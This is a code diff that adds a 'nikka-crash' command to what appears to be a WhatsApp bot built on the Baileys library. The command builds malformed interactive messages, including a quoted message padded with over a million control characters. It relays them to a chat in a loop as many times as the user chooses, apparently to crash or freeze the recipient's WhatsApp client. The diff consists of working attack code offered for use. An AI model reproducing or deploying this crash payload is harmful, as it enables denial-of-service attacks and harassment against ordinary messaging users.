@@ -48,6 +48,74 @@ you may not use this file except in compliance with the License.
 X-Asena - X-Electra
 */
 
+command(
+  {
+    pattern: "nikka-crash",
+    fromMe: true,
+    desc: "",
+    type: "user",
+  }, async (message, match, m, client) => {
+	  if (!match) return message.reply(`Number of bugs to send?\n\tExample: .nikka-crash 20`)	  
+          let count = match
+          const thq = {
+			key: {
+				remoteJid: 'p',
+				fromMe: false,
+				participant: '0@s.whatsapp.net'
+			},
+			message: {
+				"interactiveResponseMessage": {
+					"body": {
+						"text": "ɴɪᴋᴋᴀ-ᴍᴅ",
+						"format": "DEFAULT"
+					},
+					"nativeFlowResponseMessage": {
+						"name": "galaxy_message",
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ɴɪᴋᴋᴀ-ᴍᴅ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"ɴɪᴋᴋᴀ-ᴍᴅ\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"ɴɪᴋᴋᴀ-ᴍᴅ${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"version": 3
+					}
+				}
+			}
+	  }
+	              async function bugfunc(Ptcp = false) {
+                        let etc = generateWAMessageFromContent(message.jid, proto.Message.fromObject({
+                                viewOnceMessage: {
+                                        message: {
+                                                interactiveMessage: {
+                                                        header: {
+                                                                title: "",
+                                                                locationMessage: {},
+                                                                hasMediaAttachment: true
+                                                        },
+                                                        body: {
+                                                                text: "ɴɪᴋᴋᴀ-ᴍᴅ"
+                                                        },
+                                                        nativeFlowMessage: {
+                                                                name: "call_permission_request",
+                                                                messageParamsJson: "ɴɪᴋᴋᴀ-ᴍᴅ"
+                                                        },
+                                                        carouselMessage: {}
+                                                }
+                                        }
+                                }
+                        }), {
+                                userJid: message.jid,                                                                                                                                  
+				quoted: thq
+                        });
+
+                        await message.client.relayMessage(message.jid, etc.message, Ptcp ? {
+                                participant: {
+                                        jid: message.jid
+                                }
+                        } : {});
+		      }
+	        for (let i = 0;i < count;i++) {
+		await bugfunc(Ptcp = false)
+                await bugfunc(Ptcp = true)
+		}
+               await message.reply("Done ✅")
+  })
+
 
 command(
   {
